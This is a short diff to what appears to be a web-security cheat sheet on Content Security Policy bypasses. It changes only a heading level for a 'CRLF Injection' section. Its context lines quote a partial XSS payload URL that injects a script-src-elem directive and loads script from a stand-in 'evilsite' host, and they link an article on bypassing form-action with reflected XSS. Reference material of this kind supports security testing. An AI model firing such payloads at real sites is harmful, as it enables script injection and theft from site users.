@@ -206,7 +206,7 @@ http://vulnerablesite?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://evilsite/
 Bypass `form-action` directive:
 [CSP form-action Bypass with reflected XSS ](https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/)
 
-### CRLF Injection
+## CRLF Injection
 
 Some payloads:
 
